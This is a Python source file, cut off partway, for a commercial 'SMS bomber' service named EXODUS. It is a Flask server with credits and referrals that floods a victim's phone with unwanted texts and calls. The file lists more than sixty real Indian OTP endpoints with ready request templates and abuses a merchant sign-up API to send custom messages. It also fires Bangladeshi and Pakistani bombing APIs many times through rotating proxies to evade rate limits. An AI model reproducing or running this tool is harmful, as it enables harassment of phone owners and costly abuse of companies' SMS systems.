"""
EXODUS SMS BOMBER — Main.py
Flask web server + bomb engine + SQLite/Firebase dual storage
Developer: @exodus_own3r

Changes v2:
  - BD API replaced with single-URL endpoint (type=sms|call|both)
  - PROXY_MULTIPLIER: every API call fired N×10 times across proxies
  - Credits = limit value sent to BD API (more credits = more hits per proxy)
  - PORT reads SERVER_PORT for Pterodactyl panel compatibility
"""

import os, re, json, time, html, random, secrets, threading, sqlite3, signal, sys
from datetime import datetime, timezone
from functools import wraps
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
from flask import Flask, request, jsonify, session as flask_session, redirect, render_template_string

# ── Clean shutdown on SIGTERM (render.com sends this on deploy/restart) ──
def _handle_signal(sig, frame):
    print(f"[Main] signal {sig} — shutting down", flush=True)
    sys.exit(0)

signal.signal(signal.SIGTERM, _handle_signal)
signal.signal(signal.SIGINT,  _handle_signal)

# ═══════════════════════════════════════════════════════════════
#  FIREBASE SETUP
# ═══════════════════════════════════════════════════════════════
try:
    import firebase_admin
    from firebase_admin import credentials, firestore
    FIREBASE_AVAILABLE = True
except ImportError:
    FIREBASE_AVAILABLE = False

_db = None

def _init_firebase():
    global _db
    if not FIREBASE_AVAILABLE:
        return None
    try:
        if firebase_admin._apps:
            _db = firestore.client()
            return _db
        fb_key_json = os.environ.get("FIREBASE_KEY_JSON")
        fb_key_path = os.environ.get("FIREBASE_KEY_PATH", "firebase-key.json")
        if fb_key_json:
            cred = credentials.Certificate(json.loads(fb_key_json))
        elif os.path.exists(fb_key_path):
            cred = credentials.Certificate(fb_key_path)
        else:
            return None
        firebase_admin.initialize_app(cred)
        _db = firestore.client()
        return _db
    except Exception as e:
        print(f"❌ Firebase error: {e}")
        return None

_init_firebase()

def _load_dotenv(path=".env"):
    if not os.path.exists(path): return
    with open(path) as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#") or "=" not in line: continue
            k, _, v = line.partition("=")
            k, v = k.strip(), v.strip().strip('"').strip("'")
            if k and k not in os.environ: os.environ[k] = v

_load_dotenv()

ADMIN_PASSWORD = os.environ.get("ADMIN_PASSWORD", "Exodus_OWN3R")
DEVELOPER      = os.environ.get("DEVELOPER_TAG", "@exodus_own3r")
DEVELOPER_URL  = os.environ.get("DEVELOPER_URL", "https://t.me/exodus_own3r")
CONTACT        = os.environ.get("CONTACT_USERNAME", "exodus_own3r").lstrip("@")
CONTACT_URL    = f"https://t.me/{CONTACT}"

PORT       = int(os.environ.get("PORT", os.environ.get("SERVER_PORT", 5000)))
BASE_URL   = os.environ.get("BASE_URL", f"http://localhost:{PORT}").strip().rstrip("/")
SECRET_KEY = os.environ.get("SECRET_KEY") or secrets.token_hex(32)
BOT_USERNAME = os.environ.get("BOT_USERNAME", "exodus_bomber_bot")
SQLITE_PATH    = os.environ.get("SQLITE_PATH", "exodus_bot.db")

CREDITS_PER_REFERRAL       = int(os.environ.get("CREDITS_PER_REFERRAL", "3"))
CREDITS_SMS_BOMB           = int(os.environ.get("CREDITS_SMS_BOMB", "2"))
CREDITS_CALL_BOMB          = int(os.environ.get("CREDITS_CALL_BOMB", "5"))
CREDITS_CUSTOM_BOMB        = int(os.environ.get("CREDITS_CUSTOM_BOMB", "3"))
CREDITS_MIXED_BOMB_BD      = int(os.environ.get("CREDITS_MIXED_BOMB_BD", "7"))
CREDITS_NUCLEAR_IND        = int(os.environ.get("CREDITS_NUCLEAR_IND", "5"))
CREDITS_NUCLEAR_BD         = int(os.environ.get("CREDITS_NUCLEAR_BD", "30"))

PROXY_FILE       = os.environ.get("PROXY_FILE", "proxies.txt")
USE_PROXY        = os.environ.get("USE_PROXY", "true").lower() in ("1","true","yes","on")
REQUIRE_API_KEY  = os.environ.get("REQUIRE_API_KEY", "true").lower() in ("1","true","yes","on")
API_DAILY_LIMIT  = int(os.environ.get("API_DAILY_LIMIT", "500"))
# Each API endpoint is called this many times across proxies for maximum power
PROXY_MULTIPLIER = int(os.environ.get("PROXY_MULTIPLIER", "10"))

# ═══════════════════════════════════════════════════════════════
#  SQLITE DUAL-WRITE LAYER
# ═══════════════════════════════════════════════════════════════
_sq_lock = threading.Lock()

def _sq():
    conn = sqlite3.connect(SQLITE_PATH, check_same_thread=False, timeout=15)
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA synchronous=NORMAL")
    return conn

def init_sqlite():
    with _sq_lock:
        conn = _sq()
        with conn:
            conn.executescript("""
            CREATE TABLE IF NOT EXISTS users (
                id INTEGER PRIMARY KEY,
                username TEXT DEFAULT '',
                first_name TEXT DEFAULT '',
                joined_at INTEGER DEFAULT 0,
                referred_by INTEGER,
                ref_counted INTEGER DEFAULT 0,
                ref_points INTEGER DEFAULT 0,
                total_refs INTEGER DEFAULT 0,
                credits INTEGER DEFAULT 0,
                banned INTEGER DEFAULT 0,
                total_bombs INTEGER DEFAULT 0,
                is_premium INTEGER DEFAULT 0
            );
            CREATE TABLE IF NOT EXISTS api_keys (
                key TEXT PRIMARY KEY,
                user_id TEXT DEFAULT '',
                created_at INTEGER DEFAULT 0,
                expires_at INTEGER DEFAULT 0,
                revoked INTEGER DEFAULT 0,
                daily_limit INTEGER DEFAULT 500,
                plan TEXT DEFAULT ''
            );
            CREATE TABLE IF NOT EXISTS channels (
                chat_id TEXT PRIMARY KEY,
                title TEXT DEFAULT '',
                link TEXT DEFAULT '',
                added_at INTEGER DEFAULT 0
            );
            CREATE TABLE IF NOT EXISTS settings (
                k TEXT PRIMARY KEY,
                v TEXT DEFAULT ''
            );
            CREATE TABLE IF NOT EXISTS gift_codes (
                code TEXT PRIMARY KEY,
                credits INTEGER DEFAULT 0,
                max_users INTEGER DEFAULT 0,
                claimed_count INTEGER DEFAULT 0,
                expires_at INTEGER DEFAULT 0,
                created_at INTEGER DEFAULT 0,
                is_premium INTEGER DEFAULT 0
            );
            CREATE TABLE IF NOT EXISTS gift_claims (
                id TEXT PRIMARY KEY,
                code TEXT DEFAULT '',
                user_id TEXT DEFAULT '',
                claimed_at INTEGER DEFAULT 0
            );
            CREATE TABLE IF NOT EXISTS usage_log (
                id TEXT PRIMARY KEY,
                key_id TEXT DEFAULT '',
                day TEXT DEFAULT '',
                count INTEGER DEFAULT 0
            );
            """)
        conn.close()

def sq_get_user(uid):
    with _sq_lock:
        conn = _sq()
        try:
            row = conn.execute("SELECT * FROM users WHERE id=?", (int(uid),)).fetchone()
            return dict(row) if row else None
        except: return None
        finally: conn.close()

def sq_upsert_user(uid, data: dict):
    with _sq_lock:
        conn = _sq()
        try:
            existing = conn.execute("SELECT * FROM users WHERE id=?", (int(uid),)).fetchone()
            if existing:
                sets = ", ".join(f"{k}=?" for k in data if k != "id")
                vals = [v for k, v in data.items() if k != "id"] + [int(uid)]
                conn.execute(f"UPDATE users SET {sets} WHERE id=?", vals)
            else:
                data["id"] = int(uid)
                cols = ", ".join(data.keys())
                placeholders = ", ".join("?" * len(data))
                conn.execute(f"INSERT OR REPLACE INTO users ({cols}) VALUES ({placeholders})", list(data.values()))
            conn.commit()
        except Exception as e:
            print(f"[SQLite] upsert_user error: {e}")
        finally: conn.close()

def sq_update_user(uid, **kwargs):
    with _sq_lock:
        conn = _sq()
        try:
            sets = ", ".join(f"{k}=?" for k in kwargs)
            vals = list(kwargs.values()) + [int(uid)]
            conn.execute(f"UPDATE users SET {sets} WHERE id=?", vals)
            conn.commit()
        except Exception as e:
            print(f"[SQLite] update_user error: {e}")
        finally: conn.close()

def sq_incr_user(uid, field, amount):
    with _sq_lock:
        conn = _sq()
        try:
            conn.execute(f"UPDATE users SET {field}={field}+? WHERE id=?", (amount, int(uid)))
            conn.commit()
        except Exception as e:
            print(f"[SQLite] incr_user error: {e}")
        finally: conn.close()

def sq_all_users(limit=5000):
    with _sq_lock:
        conn = _sq()
        try:
            rows = conn.execute("SELECT * FROM users LIMIT ?", (limit,)).fetchall()
            return [dict(r) for r in rows]
        except: return []
        finally: conn.close()

def sq_get_key(key):
    with _sq_lock:
        conn = _sq()
        try:
            row = conn.execute("SELECT * FROM api_keys WHERE key=?", (key,)).fetchone()
            return dict(row) if row else None
        except: return None
        finally: conn.close()

def sq_upsert_key(key, data: dict):
    with _sq_lock:
        conn = _sq()
        try:
            data["key"] = key
            cols = ", ".join(data.keys())
            placeholders = ", ".join("?" * len(data))
            conn.execute(f"INSERT OR REPLACE INTO api_keys ({cols}) VALUES ({placeholders})", list(data.values()))
            conn.commit()
        except Exception as e:
            print(f"[SQLite] upsert_key error: {e}")
        finally: conn.close()

def sq_incr_usage(key):
    today = time.strftime("%Y-%m-%d", time.gmtime())
    uid_key = f"{key}_{today}"
    with _sq_lock:
        conn = _sq()
        try:
            conn.execute(
                "INSERT INTO usage_log (id, key_id, day, count) VALUES (?,?,?,1) "
                "ON CONFLICT(id) DO UPDATE SET count=count+1",
                (uid_key, key, today)
            )
            conn.commit()
            row = conn.execute("SELECT count FROM usage_log WHERE id=?", (uid_key,)).fetchone()
            return row[0] if row else 1
        except: return 0
        finally: conn.close()

def sq_usage_today(key):
    today = time.strftime("%Y-%m-%d", time.gmtime())
    uid_key = f"{key}_{today}"
    with _sq_lock:
        conn = _sq()
        try:
            row = conn.execute("SELECT count FROM usage_log WHERE id=?", (uid_key,)).fetchone()
            return row[0] if row else 0
        except: return 0
        finally: conn.close()

def sq_get_setting(k, default=None):
    with _sq_lock:
        conn = _sq()
        try:
            row = conn.execute("SELECT v FROM settings WHERE k=?", (k,)).fetchone()
            return row[0] if row else default
        except: return default
        finally: conn.close()

def sq_set_setting(k, v):
    with _sq_lock:
        conn = _sq()
        try:
            conn.execute("INSERT OR REPLACE INTO settings (k,v) VALUES (?,?)", (k, str(v)))
            conn.commit()
        except: pass
        finally: conn.close()

def sq_all_channels():
    with _sq_lock:
        conn = _sq()
        try:
            rows = conn.execute("SELECT * FROM channels").fetchall()
            return [dict(r) for r in rows]
        except: return []
        finally: conn.close()

def sq_upsert_channel(chat_id, title, link):
    with _sq_lock:
        conn = _sq()
        try:
            conn.execute(
                "INSERT OR REPLACE INTO channels (chat_id,title,link,added_at) VALUES (?,?,?,?)",
                (str(chat_id), title, link, int(time.time()))
            )
            conn.commit()
        except: pass
        finally: conn.close()

def sq_del_channel(chat_id):
    with _sq_lock:
        conn = _sq()
        try:
            conn.execute("DELETE FROM channels WHERE chat_id=?", (str(chat_id),))
            conn.commit()
        except: pass
        finally: conn.close()

def sq_import_users(users_list: list):
    with _sq_lock:
        conn = _sq()
        try:
            for u in users_list:
                if "id" not in u: continue
                data = {k: v for k, v in u.items() if k in (
                    "id","username","first_name","joined_at","referred_by",
                    "ref_counted","ref_points","total_refs","credits","banned",
                    "total_bombs","is_premium"
                )}
                cols = ", ".join(data.keys())
                placeholders = ", ".join("?" * len(data))
                conn.execute(
                    f"INSERT OR IGNORE INTO users ({cols}) VALUES ({placeholders})",
                    list(data.values())
                )
            conn.commit()
            return True
        except Exception as e:
            print(f"[SQLite] import_users error: {e}")
            return False
        finally: conn.close()

# ═══════════════════════════════════════════════════════════════
#  🇮🇳 INDIA SMS APIs (60+ OTP endpoints)
# ═══════════════════════════════════════════════════════════════
INDIA_SMS_APIS = [
    {"name": "Lenskart",        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phoneCode":"+91","telephone":"{p}"}}'},
    {"name": "NoBroker",        "url": "https://www.nobroker.in/api/v3/account/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"phone={p}&countryCode=IN"},
    {"name": "PharmEasy",       "url": "https://pharmeasy.in/api/v2/auth/send-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Wakefit",         "url": "https://api.wakefit.co/api/consumer-sms-otp/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Byjus",           "url": "https://api.byjus.com/v2/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Hungama",         "url": "https://communication.api.hungama.com/v1/communication/otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobileNo":"{p}","countryCode":"+91","appCode":"un","messageId":"1","device":"web"}}'},
    {"name": "MeruCab",         "url": "https://merucabapp.com/api/otp/generate",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"mobile_number={p}"},
    {"name": "Doubtnut",        "url": "https://api.doubtnut.com/v4/student/login",
     "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"},
     "data": lambda p: f'{{"phone_number":"{p}","language":"en"}}'},
    {"name": "PenPencil",       "url": "https://api.penpencil.co/v1/users/resend-otp?smsType=1",
     "method": "POST", "headers": {"content-type": "application/json; charset=utf-8"},
     "data": lambda p: f'{{"organizationId":"5eb393ee95fab7468a79d189","mobile":"{p}"}}'},
    {"name": "Snitch",          "url": "https://mxemjhp3rt.ap-south-1.awsapprunner.com/auth/otps/v2",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile_number":"+91{p}"}}'},
    {"name": "DaycoIndia",      "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "data": lambda p: f"api=send_otp&brand=dayco&mob={p}&resend_otp=resend_otp"},
    {"name": "BeepKart",        "url": "https://api.beepkart.com/buyer/api/v2/public/leads/buyer/otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","city":362}}'},
    {"name": "LendingPlate",    "url": "https://lendingplate.com/api.php",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "data": lambda p: f"mobiles={p}&resend=Resend"},
    {"name": "BikeFixup",       "url": "https://api.bikefixup.com/api/v2/send-registration-otp",
     "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"},
     "data": lambda p: f'{{"phone":"{p}","app_signature":"4pFtQJwcz6y"}}'},
    {"name": "WellAcademy",     "url": "https://wellacademy.in/store/api/numberLoginV2",
     "method": "POST", "headers": {"Content-Type": "application/json; charset=UTF-8"},
     "data": lambda p: f'{{"contact_no":"{p}"}}'},
    {"name": "ServeTel",        "url": "https://api.servetel.in/v1/auth/otp",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=utf-8"},
     "data": lambda p: f"mobile_number={p}"},
    {"name": "Shemaroome",      "url": "https://www.shemaroome.com/users/resend_otp",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded; charset=UTF-8"},
     "data": lambda p: f"mobile_no=%2B91{p}"},
    {"name": "MyHubble",        "url": "https://api.myhubble.money/v1/auth/otp/generate",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phoneNumber":"{p}","channel":"SMS"}}'},
    {"name": "TataCapBiz",      "url": "https://businessloan.tatacapital.com/CLIPServices/otp/services/generateOtp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobileNumber":"{p}","deviceOs":"Android","sourceName":"MitayeFaasleWebsite"}}'},
    {"name": "DealShare",       "url": "https://services.dealshare.in/userservice/api/v1/user-login/send-login-code",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","hashCode":"k387IsBaTmn"}}'},
    {"name": "Snapmint",        "url": "https://api.snapmint.com/v1/public/sign_up",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "HousingCom",      "url": "https://login.housing.com/api/v2/send-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","country_url_name":"in"}}'},
    {"name": "RentoMojo",       "url": "https://www.rentomojo.com/api/RMUsers/isNumberRegistered",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Khatabook",       "url": "https://api.khatabook.com/v1/auth/request-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","app_signature":"wk+avHrHZf2"}}'},
    {"name": "Netmeds",         "url": "https://apiv2.netmeds.com/mst/rest/v1/id/details/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Nykaa",           "url": "https://www.nykaa.com/app-api/index.php/customer/send_otp",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: f"source=sms&app_version=3.0.9&mobile_number={p}&platform=ANDROID&domain=nykaa"},
    {"name": "RummyCircle",     "url": "https://www.rummycircle.com/api/fl/auth/v3/getOtp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","isPlaycircle":false}}'},
    {"name": "Animall",         "url": "https://animall.in/zap/auth/login",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","signupPlatform":"NATIVE_ANDROID"}}'},
    {"name": "Entri",           "url": "https://entri.app/api/v3/users/check-phone/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}"}}'},
    {"name": "Cosmofeed",       "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","version":"1.4.28"}}'},
    {"name": "Aakash",          "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile_number":"{p}","activity_type":"aakash-myadmission"}}'},
    {"name": "Revv",            "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","deviceType":"website"}}'},
    {"name": "A23Games",        "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","device_id":"android123","model":"Google,Android SDK built for x86,10"}}'},
    {"name": "Spencers",        "url": "https://jiffy.spencers.in/user/auth/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "PayMeIndia",      "url": "https://api.paymeindia.in/api/v2/authentication/phone_no_verify/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","app_signature":"S10ePIIrbH3"}}'},
    {"name": "ShoppersStop",    "url": "https://www.shoppersstop.com/services/v2_1/ssl/sendOTP/OB",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","type":"SIGNIN_WITH_MOBILE"}}'},
    {"name": "WorkIndia",
     "url_fn": lambda p: f"https://api.workindia.in/api/candidate/profile/login/verify-number/?mobile_no={p}&version_number=623",
     "method": "GET", "headers": {}, "data": None},
    {"name": "PokerBaazi",      "url": "https://nxtgenapi.pokerbaazi.com/oauth/user/send-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","mfa_channels":"phno"}}'},
    {"name": "My11Circle",      "url": "https://www.my11circle.com/api/fl/auth/v3/getOtp",
     "method": "POST", "headers": {"Content-Type": "application/json;charset=UTF-8"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "MamaEarth",       "url": "https://auth.mamaearth.in/v1/auth/initiate-signup",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "HomeTriangle",    "url": "https://hometriangle.com/api/partner/xauth/signup/otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "WellnessForever", "url": "https://paalam.wellnessforever.in/crm/v2/firstRegisterCustomer",
     "method": "POST", "headers": {"Content-Type": "application/x-www-form-urlencoded"},
     "data": lambda p: 'method=firstRegisterApi&data={"customerMobile":"' + p + '","generateOtp":"true"}'},
    {"name": "HealthMug",       "url": "https://api.healthmug.com/account/createotp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "Vyapar",
     "url_fn": lambda p: f"https://vyaparapp.in/api/ftu/v3/send/otp?country_code=91&mobile={p}",
     "method": "GET", "headers": {}, "data": None},
    {"name": "Kredily",         "url": "https://app.kredily.com/ws/v1/accounts/send-otp/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "TataMotors",      "url": "https://cars.tatamotors.com/content/tml/pv/in/en/account/login.signUpMobile.json",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","sendOtp":"true"}}'},
    {"name": "Moglix",          "url": "https://apinew.moglix.com/nodeApi/v1/login/sendOTP",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","buildVersion":"24.0"}}'},
    {"name": "TrulyMadly",      "url": "https://app.trulymadly.com/api/auth/mobile/v1/send-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","locale":"IN"}}'},
    {"name": "Apna",            "url": "https://production.apna.co/api/userprofile/v1/otp/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","hash_type":"play_store"}}'},
    {"name": "Swipe",           "url": "https://app.getswipe.in/api/user/mobile_login",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","resend":true}}'},
    {"name": "MoreRetail",      "url": "https://omni-api.moreretail.in/api/v1/login/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","hash_key":"XfsoCeXADQA"}}'},
    {"name": "CountryDelight",  "url": "https://api.countrydelight.in/api/v1/customer/requestOtp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","platform":"Android","mode":"new_user"}}'},
    {"name": "Rapido",          "url": "https://customer.rapido.bike/api/otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "ConfirmTkt",
     "url_fn": lambda p: f"https://securedapi.confirmtkt.com/api/platform/registerOutput?mobileNumber={p}",
     "method": "GET", "headers": {}, "data": None},
    {"name": "BetterHalf",      "url": "https://api.betterhalf.ai/v2/auth/otp/send/",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","isd_code":"91"}}'},
    {"name": "Charzer",         "url": "https://api.charzer.com/auth-service/send-otp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}","appSource":"CHARZER_APP"}}'},
    {"name": "Mpokket",         "url": "https://web-api.mpokket.in/registration/sendOtp",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile":"{p}"}}'},
    {"name": "ShipRocket",      "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobileNumber":"{p}"}}'},
    {"name": "GoKwik",          "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","country":"in"}}'},
    {"name": "NewMe",           "url": "https://prodapi.newme.asia/web/otp/request",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"mobile_number":"{p}","resend_otp_request":true}}'},
    {"name": "Smytten",         "url": "https://route.smytten.com/discover_user/NewDeviceDetails/addNewOtpCode",
     "method": "POST", "headers": {"Content-Type": "application/json"},
     "data": lambda p: f'{{"phone":"{p}","email":"test@example.com"}}'},
]

# ═══════════════════════════════════════════════════════════════
#  🇮🇳 INDIA CUSTOM SMS (Carrybee Merchant API)
# ═══════════════════════════════════════════════════════════════
def custom_sms_india(num: str, name: str = "User", msg: str = "ExodusVerify") -> dict:
    payload = {"name": name, "phone_number": num, "business_name": msg}
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 12; V2027 Build/SP1A.210812.003) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.8059.43 Mobile Safari/537.36",
        "Accept": "application/json",
        "Content-Type": "application/json",
        "origin": "https://merchant.carrybee.com",
        "referer": "https://merchant.carrybee.com/",
    }
    try:
        r = requests.post(
            "https://api-merchant.carrybee.com/api/v2/merchant/register",
            json=payload, headers=headers, timeout=15, verify=False,
        )
        try: return r.json()
        except: return {"status": True, "raw": r.text}
    except Exception as e:
        return {"status": False, "error": str(e)}

# ═══════════════════════════════════════════════════════════════
#  🇮🇳 INDIA FIREBASE RTDBs
# ═══════════════════════════════════════════════════════════════
INDIA_FIREBASE_DBS = [
    "https://aaaa-b3749-default-rtdb.firebaseio.com",
    "https://aaya-6e335-default-rtdb.firebaseio.com",
    "https://aditya-9f66b-default-rtdb.firebaseio.com",
    "https://ai-rto-9-default-rtdb.firebaseio.com",
    "https://annapunna-12b79-default-rtdb.firebaseio.com",
    "https://business-apps-5aeb2-default-rtdb.firebaseio.com",
    "https://chfjfj-c2857-default-rtdb.firebaseio.com",
    "https://csforme-dc64a-default-rtdb.firebaseio.com",
    "https://dwala-3d1ff-default-rtdb.firebaseio.com",
    "https://dyydd-c53c8-default-rtdb.firebaseio.com",
    "https://fir-1fa16-default-rtdb.firebaseio.com",
    "https://fir-408f9-default-rtdb.firebaseio.com",
    "https://go-one-1b6b2-default-rtdb.firebaseio.com",
    "https://hopkhfg-9981a-default-rtdb.firebaseio.com",
    "https://indus-1-cec4f-default-rtdb.firebaseio.com",
    "https://jamtara118-7cd20-default-rtdb.firebaseio.com",
    "https://jamtara181-default-rtdb.firebaseio.com",
    "https://jayma-9ce22-default-rtdb.firebaseio.com",
    "https://kaatil-12346-default-rtdb.firebaseio.com",
    "https://komaljah-default-rtdb.firebaseio.com",
    "https://kumarlive1-default-rtdb.firebaseio.com",
    "https://kundan-c848c-default-rtdb.firebaseio.com",
    "https://lovefimus-default-rtdb.firebaseio.com",
    "https://mera-wala-71a5e-default-rtdb.firebaseio.com",
    "https://myabtar-default-rtdb.firebaseio.com",
    "https://myapp-8228a-default-rtdb.firebaseio.com",
    "https://navin512-54d6f-default-rtdb.firebaseio.com",
    "https://newappi-7661a-default-rtdb.firebaseio.com",
    "https://pinkyrani-default-rtdb.firebaseio.com",
    "https://pk114-6e828-default-rtdb.firebaseio.com",
    "https://pm-kisan-20-vgg-default-rtdb.firebaseio.com",
    "https://rahul-54fe9-default-rtdb.firebaseio.com",
    "https://rahulcscperosnl-default-rtdb.firebaseio.com",
    "https://raj-kumar-63492-default-rtdb.firebaseio.com",
]

# ═══════════════════════════════════════════════════════════════
#  🇧🇩 BANGLADESH — Single API endpoint (type=sms|call|both)
#  limit = credits_cost (credits spent = bombs per proxy)
#  total hits = limit × PROXY_MULTIPLIER
# ═══════════════════════════════════════════════════════════════
BD_API_BASE = "https://exodus-bd-sms-bomber-api.onrender.com/"

def _normalize_bd_phone(phone: str) -> str:
    """Convert any BD format to 01XXXXXXXXX for the API."""
    p = re.sub(r'\D', '', str(phone))
    if p.startswith("8801"):
        p = "0" + p[3:]
    elif p.startswith("880"):
        p = "0" + p[3:]
    elif p.startswith("01"):
        pass
    elif p.startswith("1") and len(p) == 10:
        p = "0" + p
    return p

def _bd_fire(phone: str, type_str: str, limit: int) -> tuple:
    """
    Fire BD API with given type and limit.
    Called PROXY_MULTIPLIER times across different proxies.
    limit = credits_cost (direct mapping: credits spent = bombs per call)
    Returns (success_count, total_calls).
    """
    bd_phone = _normalize_bd_phone(phone)
    url = f"{BD_API_BASE}?phone={bd_phone}&api=all&type={type_str}&limit={limit}"

    def _fire(_):
        try:
            proxy = get_proxy()
            r = requests.get(
                url,
                proxies=proxy,
                headers={"User-Agent": _ua()},
                timeout=20,
                verify=False,
            )
            return r.status_code in (200, 201, 202, 204)
        except:
            return False

    n = PROXY_MULTIPLIER
    with ThreadPoolExecutor(max_workers=min(n, 20)) as pool:
        results = list(pool.map(_fire, range(n)))

    success = sum(1 for r in results if r)
    return success, n

# ═══════════════════════════════════════════════════════════════
#  🇵🇰 PAKISTAN APIs
# ═══════════════════════════════════════════════════════════════
PAK_SMS_APIS = [
    {
        "name": "MainAPI",
        "url_fn": lambda p, c=10: f"https://smsbomberapi-ruby.vercel.app/api/send?phone={p}&count={c}",
        "method": "GET", "headers": {}, "data": None,
    },
    {
        "name": "LystnFM",
        "url": "https://www.lystn.fm/snippets/auth.php",
        "method": "POST",
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "data": lambda p: f"type=getotp&mobile={p}&isdCode=92",
    },
    {
        "name": "SmsBmb",
        "url": "https://sms-bmb-api.fakcloud.tech/",
        "method": "POST",
        "headers": {"Content-Type": "application/json"},
        "data": lambda p: f'{{"phone":"{p}","count":10}}',
    },
]

USER_AGENTS = [
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Mobile Safari/537.36",
